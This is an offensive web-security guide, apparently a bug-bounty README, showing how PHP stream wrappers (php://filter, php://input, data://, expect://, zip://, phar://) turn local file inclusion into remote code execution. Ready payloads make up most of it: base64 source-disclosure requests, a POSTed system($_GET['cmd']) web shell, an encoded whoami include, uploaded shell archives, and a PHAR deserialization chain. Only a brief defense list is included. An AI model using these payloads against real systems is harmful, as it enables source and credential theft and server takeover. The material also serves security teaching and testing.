# 🔥 Mastering PHP Filters & Wrappers for LFI to RCE

PHP is one of the most widely used languages in web applications. Understanding its internal features like stream wrappers can help attackers go far beyond simple file inclusion vulnerabilities.

This guide covers PHP wrappers in depth and demonstrates how to weaponize them for LFI exploitation and potential RCE in real-world applications.

---

## 🔍 Why PHP Wrappers Matter

PHP provides several built-in stream wrappers that abstract file and data input/output. While useful for developers, these can be abused in vulnerable apps:

| Wrapper       | Purpose                                      |
| ------------- | -------------------------------------------- |
| php\://filter | Filters applied to I/O streams               |
| php\://input  | Read raw POST input                          |
| data://       | Include inline data                          |
| expect://     | Execute system commands (if enabled)         |
| zip\://       | Access compressed ZIP archive files          |
| phar://       | Deserialize PHAR metadata (object injection) |

---

## 🔐 `php://filter` for Source Disclosure

Allows reading raw PHP source by bypassing execution. Example:

```
php://filter/read=convert.base64-encode/resource=config
```

URL:

```
http://<IP>/index.php?file=php://filter/read=convert.base64-encode/resource=config
```

Then decode:

```bash
echo 'PD9waHAK...' | base64 -d
```

---

## 🧰 Other PHP Wrapper Techniques

### 1. `php://input`

Reads raw POST data. Can be included if the app does `include('php://input')`:

```php
<?php include('php://input'); ?>
```

Payload:

```bash
POST /index.php
<?php system($_GET['cmd']); ?>
```

Access shell:

```
/index.php?cmd=whoami
```

### 2. `expect://`

Runs shell commands directly (rare, depends on configuration).

```php
include('expect://ls');
```

### 3. `data://`

Inline payloads using base64.

```php
include('data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==');
```

### 4. `zip://`

Treats ZIP files as virtual FS. Useful with file upload + LFI chain.

```php
include('zip://uploads/shell.zip#shell.php');
```

### 5. `phar://`

Leads to deserialization vulnerabilities. Requires object injection.

```php
include('phar://uploads/malicious.phar');
```

---

## 🗂️ Fuzzing PHP Pages

Use tools like `ffuf` or `gobuster` to discover includable files:

```bash
ffuf -w /path/to/wordlist.txt -u http://<IP>/FUZZ.php
```

Monitor for:

* `200 OK` (exists and renders)
* `403 Forbidden` (restricted, but can be included)
* `302 Found` (redirects, still exploitable via LFI)

---

## 🔐 Reading & Decoding Files

Once the LFI is confirmed, use:

```
php://filter/read=convert.base64-encode/resource=filename
```

Then decode to view sensitive data like credentials, tokens, API keys:

```bash
echo '...' | base64 -d
```

---

## 💣 From LFI to RCE — Chaining Attack Vectors

1. LFI with php\://filter → Read source
2. Find file upload functionality
3. Upload malicious PHAR archive
4. Use `phar://` to deserialize and trigger RCE

---

## 🧱 Defense Measures

* Disable `allow_url_include` & `allow_url_fopen`
* Never use user input directly in `include()`, `require()`
* Apply strict whitelisting
* Validate uploaded files
* Use hardened `php.ini` configs

---

## 📌 Real Bug Bounty Value

Exploiting PHP wrappers has led to real-world bounties through:

* Source code leaks
* SSRF + LFI chains
* RCE via PHAR + file uploads
* Hidden endpoint discovery

---

## 📢 Follow for More

This guide is maintained by **[@cybersecplayground](https://t.me/cybersecplayground)** — your daily source for advanced:

* 🔍 Recon & Exploitation
* 🧪 Web Security Payloads
* 🐞 Bug Bounty Techniques
* 💥 Real Attack Chains

Star ⭐ the repo and join us on Telegram for more content.

---

\#bugbounty #php #websecurity #lfi #rce #phpwrappers #infosec #cybersecurity
